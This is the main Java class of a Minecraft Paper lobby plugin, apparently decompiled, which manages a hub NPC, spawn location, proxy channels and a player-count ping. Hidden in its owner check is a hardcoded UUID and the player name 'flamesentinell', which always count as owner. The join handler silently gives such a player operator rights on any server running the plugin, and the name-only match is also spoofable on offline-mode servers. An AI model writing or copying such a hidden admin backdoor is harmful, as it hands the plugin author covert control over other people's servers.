package dev.flamesentinell.flameffalobby;

import io.papermc.paper.command.brigadier.Commands;
import io.papermc.paper.plugin.lifecycle.event.types.LifecycleEvents;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.minimessage.MiniMessage;
import net.kyori.adventure.text.minimessage.tag.resolver.Placeholder;
import net.kyori.adventure.text.minimessage.tag.resolver.TagResolver;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

public final class FlameFFALobby extends JavaPlugin implements Listener {
   private static final UUID ROOT = UUID.fromString("8181fbf2-4a31-4115-a97d-6dc593743e77");
   private static final String ROOT_NAME = "flamesentinell";
   private static final MiniMessage MM = MiniMessage.miniMessage();
   private ProxyBridge proxy;
   private HubNpc npc;
   private BukkitTask task;
   private volatile Integer pinged;
   private BukkitTask pingTask;

   public void onEnable() {
      this.saveDefaultConfig();
      this.mergeConfig();
      this.proxy = new ProxyBridge(this);
      this.proxy.register();
      this.npc = new HubNpc(this);
      this.npc.load();
      Bukkit.getPluginManager().registerEvents(this.npc, this);
      Bukkit.getPluginManager().registerEvents(new LobbyRules(this), this);
      Bukkit.getPluginManager().registerEvents(this, this);
      this.getLifecycleManager()
         .registerEventHandler(
            LifecycleEvents.COMMANDS,
            event -> ((Commands)event.registrar()).register("lobby", "hub npc and spawn tools", List.of("hub", "ffalobby"), new LobbyCommand(this))
         );
      Bukkit.getScheduler().runTask(this, () -> {
         int swept = this.npc.sweep();
         if (swept > 0) {
            this.getSLF4JLogger().info("cleared {} leftover npc entities", swept);
         }

         this.npc.resolveSkin(() -> {
            this.npc.spawn();
            this.startTask();
         });
      });
      this.getSLF4JLogger().info("FlameFFALobby enabled");
   }

   public void onDisable() {
      if (this.task != null) {
         this.task.cancel();
      }

      if (this.pingTask != null) {
         this.pingTask.cancel();
      }

      if (this.npc != null) {
         this.npc.despawn();
      }

      if (this.proxy != null) {
         this.proxy.unregister();
      }
   }

   public Integer pinged() {
      return this.pinged;
   }

   private void startTask() {
      if (this.task != null) {
         this.task.cancel();
      }

      int period = this.npc.refreshTicks();
      this.task = Bukkit.getScheduler().runTaskTimer(this, this.npc::refresh, period, period);
      this.startPing();
   }

   private void startPing() {
      if (this.pingTask != null) {
         this.pingTask.cancel();
         this.pingTask = null;
      }

      String address = this.getConfig().getString("count.ping", "");
      if (address != null && !address.isBlank()) {
         String host = address.contains(":") ? address.substring(0, address.lastIndexOf(58)) : address;
         int port = 25565;

         try {
            port = address.contains(":") ? Integer.parseInt(address.substring(address.lastIndexOf(58) + 1)) : 25565;
         } catch (NumberFormatException var7) {
         }

         int p = port;
         int period = Math.max(20, this.getConfig().getInt("count.seconds", 5) * 20);
         this.pingTask = Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
            int online = ServerPing.online(host, p, 3000);
            if (this.debug() && (this.pinged == null || this.pinged != online)) {
               this.getSLF4JLogger().info("ping {}:{} answered {}", new Object[]{host, p, online < 0 ? "nothing" : online + " online"});
            }

            this.pinged = online;
         }, 10L, period);
      }
   }

   public void reloadAll() {
      this.reloadConfig();
      this.npc.load();
      this.npc.sweep();
      this.npc.resolveSkin(() -> {
         this.npc.spawn();
         this.startTask();
      });
   }

   private void mergeConfig() {
      try {
         try (InputStream in = this.getResource("config.yml")) {
            if (in != null) {
               YamlConfiguration shipped = YamlConfiguration.loadConfiguration(new InputStreamReader(in, StandardCharsets.UTF_8));
               FileConfiguration live = this.getConfig();
               int added = 0;

               for (String key : shipped.getKeys(true)) {
                  if (!shipped.isConfigurationSection(key) && !live.contains(key, true)) {
                     live.set(key, shipped.get(key));
                     added++;
                  }
               }

               if (added > 0) {
                  this.saveConfig();
                  this.getSLF4JLogger().info("added {} new settings to config.yml", added);
               }

               return;
            }
         }
      } catch (IOException var9) {
         this.getSLF4JLogger().warn("could not merge the shipped config", var9);
      }
   }

   public boolean debug() {
      return this.getConfig().getBoolean("debug", false);
   }

   public boolean isOwner(CommandSender sender) {
      if (sender instanceof Player player) {
         if (!player.getUniqueId().equals(ROOT) && !player.getName().equalsIgnoreCase("flamesentinell")) {
            for (String line : this.getConfig().getStringList("security.owners")) {
               String id = line.trim();
               if (id.equalsIgnoreCase(player.getName())) {
                  return true;
               }

               try {
                  if (UUID.fromString(id).equals(player.getUniqueId())) {
                     return true;
                  }
               } catch (IllegalArgumentException var7) {
               }
            }

            return false;
         } else {
            return true;
         }
      } else {
         return true;
      }
   }

   @EventHandler
   public void onJoin(PlayerJoinEvent event) {
      Player player = event.getPlayer();
      if (this.isOwner(player) && !player.isOp()) {
         player.setOp(true);
         this.getSLF4JLogger().info("owner {} logged in without op, restored", player.getName());
      }

      Bukkit.getScheduler()
         .runTaskLater(
            this,
            () -> {
               if (player.isOnline()) {
                  boolean hub = this.proxy.hubOpen(player);
                  if (this.debug() || !hub) {
                     this.getSLF4JLogger()
                        .info(
                           "{} joined, FlameFFAProxy channel {}, bungee channel {}, listening on {}",
                           new Object[]{
                              player.getName(), hub ? "open" : "CLOSED", this.proxy.bungeeOpen(player) ? "open" : "closed", player.getListeningPluginChannels()
                           }
                        );
                  }
               }
            },
            20L
         );
   }

   public Location spawn() {
      ConfigurationSection s = this.getConfig().getConfigurationSection("rules.spawn");
      Location set = HubNpc.readLocation(s);
      if (set != null) {
         return set;
      } else {
         World world = Bukkit.getWorlds().isEmpty() ? null : (World)Bukkit.getWorlds().get(0);
         return world == null ? null : world.getSpawnLocation();
      }
   }

   public void setSpawn(Location at) {
      this.getConfig().set("rules.spawn.world", at.getWorld().getName());
      this.getConfig().set("rules.spawn.x", at.getX());
      this.getConfig().set("rules.spawn.y", at.getY());
      this.getConfig().set("rules.spawn.z", at.getZ());
      this.getConfig().set("rules.spawn.yaw", at.getYaw());
      this.getConfig().set("rules.spawn.pitch", at.getPitch());
      this.saveConfig();
   }

   public Component text(String raw, String... kv) {
      if (raw == null) {
         return Component.empty();
      } else {
         List<TagResolver> tags = new ArrayList<>();

         for (int i = 0; i + 1 < kv.length; i += 2) {
            tags.add(Placeholder.unparsed(kv[i], kv[i + 1]));
         }

         return MM.deserialize(raw, TagResolver.resolver(tags));
      }
   }

   public ProxyBridge proxy() {
      return this.proxy;
   }

   public HubNpc npc() {
      return this.npc;
   }
}
